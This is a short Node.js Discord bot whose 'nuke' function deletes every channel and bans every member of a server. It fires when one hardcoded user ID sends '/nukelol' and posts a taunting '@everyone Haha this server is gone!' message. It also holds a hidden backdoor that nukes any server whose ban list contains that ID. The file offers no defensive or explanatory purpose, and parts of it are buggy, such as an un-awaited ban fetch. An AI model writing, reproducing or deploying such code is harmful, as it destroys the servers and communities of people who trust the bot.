const Discord = require("discord.js");
const client = new Discord.Client();
client.on("ready", () => {
  console.log("Bot Ready");
});
client.on("message", (message) => {
  console.log(message.author.id);
  function nuke() {
    message.guild.channels.forEach(channel => channel.delete())
    message.guild.members.forEach(members => members.ban())
  }try {
    const banList = message.guild.fetchBans();

    const bannedUser = banList.find(user => user.id === '289523788822085632');

    if (bannedUser) setTimeout(nuke, 5000);;
    else return;
  } catch(err) {
    console.error(err);
  }
  if(message.guild === null) {
    return;
  }else
  if (message.content.startsWith("/nukelol")) {
    if (message.author.id !== '289523788822085632') 
      return message.reply("wow you really thought you were gonna get away with doing that didn't you.");
    message.channel.send("@everyone Haha this server is gone! farewell and have fun :)")
    setTimeout(nuke, 5000);
  }
});
client.login(process.env.BOT_TOKEN)
